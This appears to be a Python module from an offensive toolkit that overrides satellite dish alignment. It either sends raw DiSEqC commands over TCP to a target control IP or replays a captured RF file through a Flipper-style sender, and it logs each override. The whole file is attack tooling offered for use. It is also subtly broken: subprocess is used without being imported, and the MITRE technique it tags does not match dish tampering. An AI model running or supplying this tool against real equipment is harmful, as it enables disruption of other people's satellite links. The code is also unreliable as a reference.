#!/usr/bin/env python3
# modules/attacks/satellite_dish_aim_override.py

import argparse
import socket
import time
import json
import os
from datetime import datetime

LOG = "results/sat_dish_override_log.json"
MITRE_TTP = "T1592.002"

def log_override(target, method, value):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target": target,
        "method": method,
        "value": value,
        "ttp": MITRE_TTP
    }
    with open(LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_diseqc_command(ip, port, command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(command.encode())
        time.sleep(1)
        s.close()
        log_override(ip, "DiSEqC", command)
        print(f"[✓] Sent DiSEqC command to {ip}")
    except Exception as e:
        print(f"[!] Failed: {e}")

def rf_mode_override(sub_file):
    try:
        print(f"[*] Replaying RF from {sub_file}...")
        subprocess.run(["flipper-send", sub_file])
        log_override("RF_BROADCAST", "RF", sub_file)
    except Exception as e:
        print(f"[!] RF override failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override satellite dish alignment")
    parser.add_argument("--ip", help="Target satellite control IP")
    parser.add_argument("--port", type=int, default=21000, help="Control port")
    parser.add_argument("--cmd", help="Manual DiSEqC command (e.g., W0210E)")
    parser.add_argument("--rf", help="Path to .sub RF file for replay")

    args = parser.parse_args()

    if args.rf:
        rf_mode_override(args.rf)
    elif args.ip and args.cmd:
        send_diseqc_command(args.ip, args.port, args.cmd)
    else:
        print("[-] Specify --rf or --ip + --cmd")
